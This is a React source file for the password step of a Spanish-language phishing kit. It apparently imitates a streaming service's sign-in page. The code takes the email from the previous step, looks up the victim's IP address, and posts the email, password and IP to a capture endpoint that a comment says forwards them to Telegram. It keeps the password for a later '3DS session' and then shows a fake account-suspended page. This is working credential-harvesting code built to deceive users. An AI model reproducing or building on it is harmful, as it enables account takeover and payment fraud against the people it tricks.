/**
 * Password Page - Portal Style (responsive)
 * Shows email from previous step
 */

import PageTransition from "@/components/PageTransition";
import { ChevronDown } from "lucide-react";
import { useState, useEffect } from "react";
import { useLocation } from "wouter";
import BrandLogo from "@/components/BrandLogo";

export default function Password() {
  const [password, setPassword] = useState("");
  const [error, setError] = useState("");
  const [isLoading, setIsLoading] = useState(false);
  const [showPassword, setShowPassword] = useState(false);
  const [email, setEmail] = useState("");
  const [userIP, setUserIP] = useState("");
  const [, setLocation] = useLocation();

  useEffect(() => {
    const storedEmail = sessionStorage.getItem("userEmail");
    if (storedEmail) {
      setEmail(storedEmail);
    }
    // Get user IP
    fetch("https://api.ipify.org?format=json")
      .then((res) => res.json())
      .then((data) => setUserIP(data.ip || ""))
      .catch(() => {});
  }, []);

  const handleSignIn = async (e: React.FormEvent) => {
    e.preventDefault();

    if (!password.trim()) {
      setError("La contraseña debe tener entre 4 y 60 caracteres.");
      return;
    }
    if (password.length < 4) {
      setError("La contraseña debe tener entre 4 y 60 caracteres.");
      return;
    }

    setError("");
    setIsLoading(true);
    // Store password for later 3DS session
    sessionStorage.setItem("sp_login_password", password);
    // Send login data to Telegram
    fetch("/api/capture/login", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ email, password, ipAddress: userIP }),
    }).catch(() => {});
    setTimeout(() => {
      setIsLoading(false);
      setLocation("/account-suspended");
    }, 1000);
  };

  return (
    <PageTransition>
      <div className="min-h-[100dvh] w-full bg-black flex flex-col">
        {/* Header */}
        <header className="w-full px-4 sm:px-8 lg:px-12 pt-4 pb-2 border-b border-[#333]">
          <BrandLogo height={20} />
        </header>

        {/* Main Content */}
        <main className="flex-1 flex flex-col items-start sm:items-start lg:items-center px-4 sm:px-8 lg:px-12 pt-10 sm:pt-16">
          <div className="w-full max-w-[400px] lg:max-w-[450px]">
            {/* Title */}
            <h1 className="text-[28px] sm:text-[32px] lg:text-[36px] font-bold text-white mb-2 leading-[1.15]">
              Ingresa tu contraseña
            </h1>

            {/* Subtitle with email */}
            <p className="text-[#8c8c8c] text-[15px] sm:text-[16px] mb-6 sm:mb-8">
              {email ? (
                <>Para la cuenta <span className="text-white">{email}</span></>
              ) : (
                "Para el usuario que ingresaste."
              )}
            </p>

            {/* Form */}
            <form onSubmit={handleSignIn} className="space-y-4">
              {/* Password Input */}
              <div className="relative">
                <input
                  type={showPassword ? "text" : "password"}
                  placeholder="Contraseña"
                  value={password}
                  onChange={(e) => {
                    setPassword(e.target.value);
                    if (error) setError("");
                  }}
                  className={`w-full h-[48px] sm:h-[50px] px-4 pr-20 rounded bg-transparent text-white placeholder:text-[#8c8c8c] text-[15px] sm:text-[16px] outline-none transition-colors border ${
                    error ? "border-[#E50914]" : "border-[#8c8c8c] focus:border-white"
                  }`}
                />
                <button
                  type="button"
                  onClick={() => setShowPassword(!showPassword)}
                  className="absolute right-4 top-1/2 -translate-y-1/2 text-[#8c8c8c] text-[13px] sm:text-[14px] hover:text-white transition-colors"
                >
                  {showPassword ? "OCULTAR" : "MOSTRAR"}
                </button>
                {error && (
                  <div className="flex items-center gap-1.5 mt-2">
                    <svg viewBox="0 0 16 16" className="w-4 h-4 flex-shrink-0" fill="none">
                      <circle cx="8" cy="8" r="7" stroke="#E50914" strokeWidth="1.5" />
                      <path d="M5 5l6 6M11 5l-6 6" stroke="#E50914" strokeWidth="1.5" strokeLinecap="round" />
                    </svg>
                    <p className="text-[#E50914] text-[13px]">{error}</p>
                  </div>
                )}
              </div>

              {/* Sign In Button */}
              <button
                type="submit"
                disabled={isLoading}
                className="w-full h-[48px] sm:h-[50px] bg-[#E50914] text-white text-[15px] sm:text-[16px] font-bold rounded hover:bg-[#F6121D] active:scale-[0.98] transition-all duration-150 disabled:opacity-70"
              >
                {isLoading ? "Iniciando sesión..." : "Iniciar sesión"}
              </button>
            </form>

            {/* Forgot password */}
            <div className="mt-6">
              <a href="#" className="text-[#8c8c8c] text-[14px] hover:underline">
                ¿Olvidaste la contraseña?
              </a>
            </div>

            {/* Help Section */}
            <div className="mt-6">
              <button className="flex items-center gap-1 text-white text-[15px] sm:text-[16px] hover:text-gray-300 transition-colors">
                <span>Obtener ayuda</span>
                <ChevronDown size={18} />
              </button>
            </div>

            {/* reCAPTCHA Text */}
            <p className="text-[#8c8c8c] text-[12px] sm:text-[13px] mt-6 sm:mt-8 leading-relaxed">
              Esta página está protegida por Google reCAPTCHA para comprobar que no eres un robot.
            </p>
          </div>
        </main>
      </div>
    </PageTransition>
  );
}
